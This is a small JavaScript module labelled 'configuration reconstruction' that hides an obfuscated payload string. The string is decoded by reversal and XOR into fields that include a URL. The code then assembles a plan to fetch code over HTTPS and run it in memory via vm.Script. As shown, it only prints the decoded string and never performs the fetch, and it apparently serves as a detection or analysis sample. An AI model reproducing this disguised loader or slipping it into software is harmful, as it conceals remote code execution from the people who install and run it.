// configuration reconstruction
const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_328e2ea6 = "\\u0068\\u0033\\u003e\\u006c\\u0025\\u007e\\u0063\\u006e\\u007f\\u004b\\u006f\\u006e\\u0065\\u0044\\u0037\\u007e\\u0064\\u006f\\u006d\\u006b\\u0055\\u0078\\u006f\\u0079\\u007f\\u0076\\u0063\\u007a\\u006b\\u0025\\u006e\\u0063\\u0066\\u006b\\u007c\\u0064\\u0063\\u0024\\u006f\\u0066\\u007a\\u0067\\u006b\\u0072\\u006f\\u0024\\u006f\\u006e\\u006f\\u003e\\u0038\\u0032\\u003c\\u006c\\u0068\\u0033\\u003e\\u006c\\u0027\\u006f\\u006e\\u0065\\u0064\\u0025\\u0025\\u0030\\u0079\\u007a\\u007e\\u007e\\u0062\\u0037\\u0066\\u0078\\u007f\\u0076\\u0038\\u0032\\u003c\\u004c\\u0048\\u0033\\u003e\\u004c\\u0027\\u004f\\u004e\\u0045\\u0044\\u0037\\u006e\\u0063\\u0055\\u0064\\u006d\\u0063\\u006b\\u007a\\u0067\\u006b\\u0069\\u0076\\u003b\\u0037\\u007e\\u0064\\u007f\\u0065\\u0069\\u0055\\u006f\\u006d\\u006b\\u007e\\u0079\\u0076\\u0067\\u007c\\u0055\\u0064\\u006f\\u0062\\u007e\\u0055\\u0079\\u007a\\u007e\\u007e\\u0062\\u0037\\u0078\\u006f\\u007e\\u007a\\u006b\\u006e\\u006b\\u0076\\u0073\\u0078\\u0065\\u0067\\u006f\\u0067\\u0055\\u0062\\u0069\\u007e\\u006b\\u007a\\u0079\\u0063\\u006e\\u0026\\u006f\\u007e\\u0065\\u0067\\u006f\\u0078\\u0055\\u006f\\u0078\\u0063\\u007f\\u007b\\u0069\\u006b\\u0037\\u0079\\u007a\\u006f\\u007e\\u0079\\u0076\\u003b\\u0037\\u007c";
const Codec_328e2ea6 = "unicode_escapes|reverse_then_xor|0a";

function load_328e2ea6() { return [...Material_328e2ea6.matchAll(/\\u00([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }
function decode_328e2ea6(e) { return [...e].reverse().map((value) => value ^ 10); }
async function recover_328e2ea6() {
  const n = 2 > 1 ? "left" : "right";
  const e = load_328e2ea6(); let d = [];
  for (const stage of [decode_328e2ea6]) d = stage(e);
  void n; return Buffer.from(d).toString("ascii");
}
async function inspect_328e2ea6() { return JSON.parse(JSON.stringify({ value: await recover_328e2ea6() })).value; }
async function plan_328e2ea6() { const inspect = inspect_328e2ea6; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }
void moduleShape; void plan_328e2ea6;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_328e2ea6());

// reconstruction complete